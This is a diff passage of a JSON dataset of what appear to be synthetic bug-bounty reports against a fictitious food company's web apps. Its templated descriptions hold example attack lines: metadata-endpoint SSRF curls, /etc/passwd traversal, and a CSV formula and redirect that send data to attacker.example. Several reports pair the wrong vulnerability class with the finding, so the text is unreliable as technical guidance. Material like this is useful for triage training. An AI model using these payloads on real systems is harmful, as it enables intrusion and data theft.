@@ -14298,7 +14406,8 @@
           "offset": "3d 1h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.laerchenquell-foods.foo/admin/items`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -14424,7 +14533,8 @@
           "offset": "4d 1h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.laerchenquell-foods.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14547,7 +14657,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.laerchenquell-foods.foo/fetch`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14679,7 +14790,8 @@
           "offset": "1d 10h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://shop.laerchenquell-foods.foo/export`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14823,7 +14935,8 @@
           "offset": "7d 17h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.laerchenquell-foods.foo/statements/`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14953,7 +15066,8 @@
           "offset": "6d 19h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://shop.laerchenquell-foods.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15073,7 +15187,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://shop.laerchenquell-foods.foo/import`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15193,7 +15308,8 @@
           "offset": "2d 21h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.laerchenquell-foods.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15320,7 +15436,8 @@
           "offset": "15h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.laerchenquell-foods.foo/admin/queue`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -15452,7 +15569,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://auth.laerchenquell-foods.foo/admin/items`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -15570,7 +15688,8 @@
           "offset": "6d 7h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.laerchenquell-foods.foo/import`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15746,7 +15865,8 @@
           "offset": "8d 22h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://shop.laerchenquell-foods.foo/fetch`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15880,7 +16000,8 @@
           "offset": "3d 14h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.laerchenquell-foods.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16014,7 +16135,8 @@
           "offset": "8d 21h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://shop.laerchenquell-foods.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16116,7 +16238,8 @@
           "offset": "2d 14h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.laerchenquell-foods.foo/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16244,7 +16367,8 @@
           "offset": "6d 12h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.laerchenquell-foods.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16339,7 +16463,8 @@
           "offset": "4d 2h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.laerchenquell-foods.foo/fetch`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16464,7 +16589,8 @@
           "offset": "4d",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.laerchenquell-foods.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16617,7 +16743,8 @@
           "offset": "5d 1h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.laerchenquell-foods.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16789,7 +16916,8 @@
           "offset": "5d 14h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.laerchenquell-foods.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16928,7 +17056,8 @@
           "offset": "5d 14h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.laerchenquell-foods.foo/export`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17025,7 +17154,8 @@
           "offset": "6d 1h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.laerchenquell-foods.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17151,7 +17281,8 @@
           "offset": "6d 6h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.laerchenquell-foods.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17275,7 +17406,8 @@
           "offset": "2d 17h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.laerchenquell-foods.foo/api/documents/`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17371,7 +17503,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.laerchenquell-foods.foo/admin/queue`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -17487,7 +17620,8 @@
           "offset": "1d 6h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.laerchenquell-foods.foo/api/documents/`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17639,7 +17773,8 @@
           "offset": "6d 21h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.laerchenquell-foods.foo/profile`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17823,7 +17958,8 @@
           "offset": "7d 17h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.laerchenquell-foods.foo/profile`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17954,7 +18090,8 @@
           "offset": "1d 9h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.laerchenquell-foods.foo/admin/queue`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -18106,7 +18243,8 @@
           "offset": "3d 18h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.laerchenquell-foods.foo/export`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18225,7 +18363,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.laerchenquell-foods.foo/api/v2/documents/`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -18369,7 +18508,8 @@
           "offset": "3d 8h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
